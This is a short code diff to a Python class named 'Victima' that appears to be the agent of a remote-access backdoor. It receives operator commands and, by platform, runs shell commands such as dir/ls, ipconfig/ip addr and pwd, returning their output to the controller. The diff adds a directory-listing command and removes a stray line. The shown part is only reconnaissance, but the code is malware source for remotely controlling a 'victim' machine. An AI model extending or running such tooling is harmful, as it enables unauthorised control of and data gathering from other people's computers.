@@ -153,6 +153,9 @@ class Victima(object):
 			elif (datosEleccion=="pwd"):
 				self.pwd()
 
+			elif (datosEleccion=="ls"):
+				self.ls()
+
 
 		return
 
@@ -271,7 +274,6 @@ class Victima(object):
 			self.enviar_completo("ipconfig")
 
 		elif (plataforma=="linux") or (plataforma=="mac"):
-			t
 			self.enviar_completo("ip addr")
 
 		return
@@ -286,6 +288,16 @@ class Victima(object):
 
 		elif (plataforma=="linux") or (plataforma=="mac"):
 			self.enviar_completo("pwd")
+
+		return
+
+	def ls(self):
+
+		if (plataforma=="win"):
+			self.enviar_completo("dir")
+
+		elif (plataforma=="linux") or (plataforma=="mac"):
+			self.enviar_completo("ls")
 
 		return
 
